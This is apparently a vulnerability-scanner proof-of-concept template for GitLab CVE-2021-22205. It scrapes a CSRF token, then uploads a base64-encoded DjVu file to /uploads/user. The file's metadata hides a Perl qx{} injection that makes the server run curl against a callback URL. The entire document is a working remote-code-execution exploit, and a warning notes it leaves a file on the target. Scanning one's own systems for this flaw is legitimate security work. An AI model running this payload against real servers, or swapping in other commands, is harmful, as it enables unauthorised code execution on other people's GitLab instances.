name: poc-yaml-gitlab-cve-2021-22205-rce
binding: 830c2df3-5e90-495e-8050-deb3b4b78227
manual: true
detail:
    author: raiynin
    links:
        - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml
    vulnerability:
        id: CT-152116
        level: critical
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /users/sign_in
        expression: response.status == 200
        output:
            search: '''"csrf-token" content="(?P<csrftoken>.+?)"''.bsubmatch(response.body)'
            csrftoken: search["csrftoken"]
    r1:
        request:
            cache: true
            method: POST
            path: /uploads/user
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
                X-CSRF-Token: '{{csrftoken}}'
            body: !!binary |
                DQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlJTXYzbXhSZzU5VGtGU1g1DQpDb250ZW50LU
                Rpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0idGVzdC5q
                cGciDQpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcNCg0KQVQmVEZPUk0AAAOvREpWTURJUk
                0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZP
                Uk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAE
                JHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0A
                AAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHtjdXJsIH
                t7cmV2ZXJzZVVSTH19fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
                ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
                AgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5k
                YXJ5SU12M214Umc1OVRrRlNYNS0tDQo=
        expression: response.status == 422 && reverse.wait(5)
expression: r0() && r1()
